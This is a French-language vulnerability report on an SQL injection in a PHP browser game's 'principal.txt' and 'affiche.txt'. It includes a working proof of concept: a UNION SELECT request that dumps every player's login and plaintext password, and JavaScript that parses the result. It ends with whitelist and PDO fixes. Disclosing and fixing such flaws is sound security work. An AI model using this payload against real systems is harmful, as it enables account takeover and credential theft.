# Rapport de vulnérabilité — Injection SQL dans `principal.txt`

**Date :** 2026-08-28  
**Sévérité :** CRITIQUE  
**Statut :** Non corrigé

---

## Résumé

Une injection SQL dans le paramètre `table` de `principal.txt` permet à tout joueur authentifié d'extraire l'intégralité des identifiants et mots de passe de tous les commandants en une seule requête HTTP.

---

## Localisation

| Fichier | Ligne | Variable vulnérable |
|---------|-------|---------------------|
| `php/ordres/principal.txt` | 41 | `$_GET['table']` via `$table` |
| `php/ordres/affiche.txt` | 2 | `$table` (secondaire) |

---

## Cause racine

`$_GET['table']` est assigné à `$table` sans liste blanche stricte. La branche `else if ($table != "")` accepte n'importe quelle valeur non whitelistée et l'injecte dans deux requêtes SQL :

```php
// principal.txt:41 — $table injecté dans FROM
$result128 = mysql($base, "SELECT COUNT(*) as total FROM $table WHERE NUMERO=$commandant");
$row128 = mysql_fetch_row($result128);
// ...
echo "<h1>Ordres déjà passé (" . $row128[0] . ")</h1>";
```

```php
// affiche.txt:2 — même $table, même vulnérabilité
$result = mysql($base, "SELECT * FROM $table WHERE NUMERO='$commandant'");
```

---

## Conditions d'exploitation

| Condition | Valeur |
|-----------|--------|
| Authentification | Oui — n'importe quel compte joueur |
| Complexité | Faible |
| Outils nécessaires | Navigateur web |

---

## Proof of Concept — Extraction de tous les mots de passe en une requête

### Mécanique d'exfiltration

`affiche.txt` sérialise chaque ligne de résultat et l'encode dans un lien "Copier" :

```php
$encode = urlencode(serialize($rf));  // $rf[0] = notre donnée injectée
echo "<a href='?...&previous={$encode}'>Copier</a>";
```

Le résultat est lisible directement dans la réponse HTML sans outil spécialisé.

### Requête HTTP

```
GET /ordres/index.php3?table=construire%20WHERE%201%3D0%20UNION%20SELECT%20GROUP_CONCAT(LOGIN%2C0x3a%2CMOT_DE_PASSE%20ORDER%20BY%20NUMERO%20SEPARATOR%200x0a)%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%20FROM%20aa_registre%20WHERE%20NUMERO%3E0--%20-
Cookie: PHPSESSID=<session_valide>
```

### SQL injecté

La table `construire` possède 6 colonnes. Le UNION SELECT doit en fournir autant :

```sql
-- affiche.txt et principal.txt reçoivent tous les deux :
SELECT * FROM construire WHERE 1=0
UNION SELECT
  GROUP_CONCAT(LOGIN, ':', MOT_DE_PASSE ORDER BY NUMERO SEPARATOR '\n'),
  NULL, NULL, NULL, NULL, NULL
FROM aa_registre WHERE NUMERO > 0-- -
```

### Extraction du résultat (JavaScript)

```javascript
const r    = await fetch(`index.php3?table=${encodeURIComponent(inj)}`, {credentials:'include'});
const text = await r.text();

const prev       = text.match(/previous=([^"&\s]+)/)?.[1];
const serialized = decodeURIComponent(prev);
const data       = serialized.match(/i:0;s:\d+:"([\s\S]+?)";i:1/)?.[1];

data.split('\n').forEach((line, i) => {
    const [login, ...rest] = line.split(':');
    console.log(`[${i+1}] login: ${login} | mdp: ${rest.join(':')}`);
});
```

### Résultat

```
🔑 CREDENTIALS EXTRAITS:
────────────────────────────────────────
  [1] login: <login_1> | mdp: <mdp_1>
  [2] login: <login_2> | mdp: <mdp_2>
  ...
────────────────────────────────────────
```

> **Note :** Les mots de passe sont stockés en clair en base de données.

---

## Impact

- Extraction de tous les couples login/mot de passe en **une seule requête**
- Connexion possible sous n'importe quel compte
- Risque de réutilisation des mots de passe sur des services externes (email, Discord)
- Passage d'ordres au nom de tous les joueurs

---

## Correctif

### `php/ordres/principal.txt` — liste blanche sur `$table`

```php
// Ajouter avant la ligne 41
$allowed_tables = array_merge($code_ordres, ['list_ordres', 'diviser_flotte']);
if (!in_array($table, $allowed_tables, true)) {
    $row128 = null;
} else {
    $result128 = mysql($base, "SELECT COUNT(*) as total FROM `$table` WHERE NUMERO=$commandant");
    $row128 = mysql_fetch_row($result128);
}
```

### Correction de fond — migration vers PDO

```php
$stmt = $pdo->prepare("SELECT COUNT(*) FROM `$table` WHERE NUMERO = ?");
$stmt->execute([$commandant]);
$row128 = $stmt->fetch();
```

> La liste blanche reste nécessaire même avec PDO — un nom de table ne peut pas être paramétré.

---

## Timeline

| Date | Événement |
|------|-----------|
| 2026-08-28 | Découverte lors de l'analyse de `principal.txt` |
| 2026-08-28 | Exploitation confirmée — credentials extraits en une requête |
| 2026-08-28 | Rapport rédigé |
| En attente | Correction |
